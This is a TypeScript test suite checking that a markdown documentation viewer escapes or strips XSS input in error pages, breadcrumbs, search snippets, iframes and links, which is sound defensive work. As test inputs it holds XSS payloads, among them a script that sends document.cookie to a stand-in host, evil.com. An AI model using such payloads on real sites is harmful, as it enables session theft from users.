import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import DOMPurify from 'dompurify';
import { escapeHtml } from '../src/core/escape';
import { Layout } from '../src/ui/layout';
import { DEFAULT_CONFIG } from '../src/core/config';

describe('Security and XSS Sanitization Suite', () => {
  describe('404 XSS Prevention', () => {
    it('escapes malicious script and img tags in 404 error template', () => {
      const maliciousHashPath = '<img src=x onerror=alert(document.domain)>.md';
      const escaped = escapeHtml(maliciousHashPath);
      const template = `<p>Could not locate the requested markdown file: <code>${escaped}</code>.</p>`;

      expect(template).not.toContain('<img src=x onerror=alert(document.domain)>');
      expect(template).toContain('&lt;img src=x onerror=alert(document.domain)&gt;.md');
    });

    it('escapes complex nested script payloads', () => {
      const payload = '"><script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>';
      const escaped = escapeHtml(payload);
      expect(escaped).not.toContain('<script>');
      expect(escaped).not.toContain('"');
      expect(escaped).toContain('&quot;&gt;&lt;script&gt;');
    });
  });

  describe('Breadcrumb XSS Prevention', () => {
    let mockBreadcrumbEl: any;
    let mockAppEl: any;
    let origDocument: any;

    beforeEach(() => {
      origDocument = (global as any).document;
      mockBreadcrumbEl = {
        style: {},
        innerHTML: ''
      };
      mockAppEl = {
        innerHTML: '',
        querySelector: vi.fn().mockReturnValue({ addEventListener: vi.fn() }),
        querySelectorAll: vi.fn().mockReturnValue([])
      };

      (global as any).document = {
        getElementById: vi.fn((id: string) => {
          if (id === 'verti-breadcrumbs') return mockBreadcrumbEl;
          if (id === 'verti-content') return { innerHTML: '' };
          if (id === 'verti-toc') return { innerHTML: '' };
          if (id === 'verti-app') return mockAppEl;
          return null;
        }),
        body: mockAppEl,
        createElement: vi.fn(() => ({
          addEventListener: vi.fn(),
          appendChild: vi.fn(),
          querySelector: vi.fn(),
          querySelectorAll: vi.fn().mockReturnValue([])
        }))
      };
    });

    afterEach(() => {
      (global as any).document = origDocument;
    });

    it('escapes malicious folder segments and page titles in breadcrumbs', () => {
      const layout = new Layout(DEFAULT_CONFIG);

      const maliciousPath = '<b onmouseover=alert(1)>folder</b>/subfolder/page.md';
      const maliciousTitle = 'My <img src=x onerror=alert(1)> Title';

      layout.updateBreadcrumbs(maliciousPath, maliciousTitle);

      expect(mockBreadcrumbEl.innerHTML).not.toContain('<b onmouseover');
      expect(mockBreadcrumbEl.innerHTML).not.toContain('<img src=x onerror=alert(1)>');
      expect(mockBreadcrumbEl.innerHTML).toContain('&lt;img src=x onerror=alert(1)&gt;');
    });
  });

  describe('Search Snippet Escaping', () => {
    it('escapes raw HTML snippets before rendering', () => {
      const rawSnippet = 'Found match in <svg onload=alert(1)> and <b style="color:red">bold</b>';
      const escapedSnippet = escapeHtml(rawSnippet);

      const renderedItem = `<div class="verti-search-result-snippet">${escapedSnippet}</div>`;

      expect(renderedItem).not.toContain('<svg onload=alert(1)>');
      expect(renderedItem).toContain('&lt;svg onload=alert(1)&gt;');
    });
  });

  describe('Iframe Sandbox & Security Hook', () => {
    it('enforces sandbox attribute on valid https iframes and removes invalid protocols', async () => {
      let registeredHook: ((node: any, data: any) => void) | null = null;
      (DOMPurify as any).addHook = vi.fn((name: string, cb: any) => {
        if (name === 'uponSanitizeElement') registeredHook = cb;
      });
      (DOMPurify as any).removeHook = vi.fn();
      (DOMPurify as any).sanitize = vi.fn((html: string) => html);

      const { MarkdownParser } = await import('../src/core/parser');
      const parser = new MarkdownParser();
      parser.parse('# Test');

      expect(registeredHook).toBeDefined();

      // Test valid https iframe
      const validEl = {
        getAttribute: vi.fn().mockImplementation((attr: string) => {
          if (attr === 'src') return 'https://example.com/embed';
          return null;
        }),
        setAttribute: vi.fn(),
        remove: vi.fn()
      };
      registeredHook!(validEl, { tagName: 'iframe' });
      expect(validEl.setAttribute).toHaveBeenCalledWith('sandbox', 'allow-scripts allow-same-origin allow-popups allow-forms allow-presentation');
      expect(validEl.remove).not.toHaveBeenCalled();

      // Test dangerous iframe
      const invalidEl = {
        getAttribute: vi.fn().mockImplementation((attr: string) => {
          if (attr === 'src') return 'javascript:alert(1)';
          return null;
        }),
        setAttribute: vi.fn(),
        remove: vi.fn()
      };
      registeredHook!(invalidEl, { tagName: 'iframe' });
      expect(invalidEl.remove).toHaveBeenCalled();
    });
  });

  describe('Dangerous URI Scheme Neutralization', () => {
    it('strips javascript: and vbscript: hrefs from anchor elements', async () => {
      const { Router } = await import('../src/core/router');
      const router = new Router('index.md', async () => {});

      const mockAnchor = {
        getAttribute: vi.fn().mockReturnValue('javascript:alert(1)'),
        removeAttribute: vi.fn(),
        setAttribute: vi.fn()
      };

      const container = {
        querySelectorAll: vi.fn().mockImplementation((selector: string) => {
          if (selector === 'a[href]') {
            return [mockAnchor];
          }
          return [];
        })
      };

      router.transformLinks(container as any);
      expect(mockAnchor.removeAttribute).toHaveBeenCalledWith('href');
      expect(mockAnchor.setAttribute).not.toHaveBeenCalledWith('target', '_blank');
    });
  });
});
